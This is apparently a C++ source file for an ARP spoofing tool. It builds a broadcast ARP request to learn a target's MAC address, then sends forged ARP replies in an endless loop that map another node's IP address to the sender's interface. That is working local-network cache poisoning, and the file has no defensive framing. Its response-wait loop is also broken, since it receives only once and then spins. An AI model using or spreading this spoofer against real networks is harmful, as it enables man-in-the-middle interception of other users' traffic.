
#include "arp_spoofer.hpp"

#include <chrono>
#include <thread>

[[nodiscard]] auto ArpSpoofer::create(ArpFrame::praddr_t target,
                                      ArpFrame::praddr_t node) noexcept
    -> std::expected<ArpSpoofer, network_interfaces::Errors> {
    auto active_iface = NetworkActiveInterface::create();
    if (not active_iface) {
        return std::unexpected{active_iface.error()};
    }
    auto arp_client = ArpClient::create();
    if (not arp_client) {
        return std::unexpected{arp_client.error()};
    }
    return ArpSpoofer{target, node, std::move(arp_client.value()),
                      std::move(active_iface.value())};
}

ArpSpoofer::ArpSpoofer(ArpFrame::praddr_t target, ArpFrame::praddr_t node,
                       ArpClient&& client,
                       NetworkActiveInterface&& active_iface) noexcept
    : _target_addr{target},
      _node_addr(node),
      _arp_client{std::move(client)},
      _active_iface{std::move(active_iface)} {}

[[noreturn]] auto ArpSpoofer::startSpoofing(u32 interval) -> void {
    ArpFrame request_frame = generateBroadcastArpRequest();
    _arp_client.sendFrame(request_frame);
    std::optional<ArpFrame> received_response = std::nullopt;
    for (received_response = _arp_client.recvResponseToFrame(request_frame);
         not received_response.has_value();) {
    }

    for (;;) {
        ArpFrame spoofing_frame =
            generateSpoofingArpResponse(received_response.value());
        _arp_client.sendFrame(spoofing_frame);
        std::this_thread::sleep_for(std::chrono::seconds(interval));
    }
}

[[nodiscard]] auto ArpSpoofer::generateBroadcastArpRequest() -> ArpFrame {
    constexpr u16 ethernet_hw_type = 0x0001;
    constexpr u16 ipv4_pr_type = 0x0800;
    constexpr ArpFrame::hwaddr_t broadcast_hwaddr{0xFF, 0xFF, 0xFF,
                                                  0xFF, 0xFF, 0xFF};
    ArpFrame arp_frame{};
    arp_frame.setHeaderHwAddrSize(ArpFrame::getHwAddrSize());
    arp_frame.setHeaderPrAddrSize(ArpFrame::getPrAddrSize());
    arp_frame.setHeaderHwAddrType(ethernet_hw_type);
    arp_frame.setHeaderPrAddrType(ipv4_pr_type);
    arp_frame.setHeaderOpcode(ArpFrame::request_opcode);
    arp_frame.setPayloadDestinationHwAddr(broadcast_hwaddr);
    arp_frame.setPayloadDestinationPrAddr(_target_addr);
    arp_frame.setPayloadSourceHwAddr(_active_iface.getHardwareAddr().value());
    arp_frame.setPayloadSourcePrAddr(_active_iface.getProtocolAddr().value());

    return arp_frame;
}

[[nodiscard]] auto ArpSpoofer::generateSpoofingArpResponse(
    ArpFrame target_response) -> ArpFrame {
    ArpFrame arp_frame = generateBroadcastArpRequest();
    arp_frame.setHeaderOpcode(ArpFrame::response_opcode);
    arp_frame.setPayloadDestinationHwAddr(
        target_response.getPayloadSourceHwAddr());
    arp_frame.setPayloadSourcePrAddr(_node_addr);

    return arp_frame;
}
